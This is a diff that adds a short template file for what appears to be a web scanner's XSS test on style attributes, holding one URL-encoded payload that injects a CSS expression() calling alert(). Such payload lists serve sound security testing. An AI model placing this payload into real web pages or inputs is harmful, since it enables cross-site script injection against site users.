@@ -1,0 +1,4 @@
+;template file for XssTestAttributeOnStyle payload
+;comments start with semicolon
+;payloads should be added line by line
+%20style=%22xss:expression(alert(501337))%22%20/%3E
